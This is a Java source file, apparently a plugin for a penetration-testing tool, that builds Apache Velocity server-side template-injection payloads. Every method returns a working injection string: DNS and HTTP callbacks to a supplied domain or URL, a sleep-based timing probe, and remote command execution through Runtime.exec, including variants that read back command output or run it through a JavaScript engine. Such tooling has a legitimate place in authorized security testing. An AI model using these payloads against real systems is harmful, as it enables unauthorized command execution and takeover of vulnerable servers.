package me.gv7.woodpecker.plugin.exprs;

import me.gv7.woodpecker.plugin.IExpr;

import static me.gv7.woodpecker.plugin.utils.Utils.escape;

public class VelocityExpr implements IExpr {

    @Override
    public String getName() {
        return "Velocity";
    }

    @Override
    public String[] genDnslog(String domain) {
        return new String[]{
                "#set($x='') $x.class.forName('java.net.InetAddress').getByName('" + escape(domain) + "')"
        };
    }

    @Override
    public String[] genHttplog(String url) {
        return new String[]{
                "#set($x='') $x.class.forName('java.net.URL').declaredConstructors[2].newInstance('" + escape(url) + "').getContent()"
        };
    }

    @Override
    public String[] genSleep(int sec) {
        return new String[]{
                "#set($x='') $x.class.forName('java.lang.Thread').sleep(" + sec * 1000 + ")"
        };
    }

    @Override
    public String[] genExec(String command) {
        return new String[]{
                "#set($x='') $x.class.forName('java.lang.Runtime').getRuntime().exec('" + escape(command) + "')"
        };
    }

    @Override
    public String[] genExecWithEcho(String command) {
        return new String[]{
                "#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('" + escape(command) + "')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
                "#set($x='') $x.class.forName('javax.script.ScriptEngineManager').declaredConstructors[0].newInstance().getEngineByName('js').eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"" + escape(command, "\"") + "\").getInputStream()).useDelimiter(\"/\").next();')"
        };
    }
}
